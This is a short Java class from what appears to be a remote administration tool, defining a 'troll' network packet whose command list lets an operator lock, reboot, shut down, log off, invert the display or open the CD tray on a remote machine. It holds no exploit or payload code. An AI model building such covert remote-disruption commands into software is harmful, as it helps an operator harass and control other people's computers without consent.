package com.melardev.xeytanj.net.packets;

public class PacketTroll extends Packet{

	public static enum Command{
		LOCK, TURN_ON_DISPLAY, CDROM_OPEN, CDROM_CLOSE, TURN_OFF_DISPLAY, REBOOT, SHUTDOWN, INVERT_COLORS, INVERT_DISPLAY, LOG_OFF,
	}
	public Command command;
	public PacketTroll(Command cmd){
		super(PacketType.TROLL);
		command = cmd;
	}

}
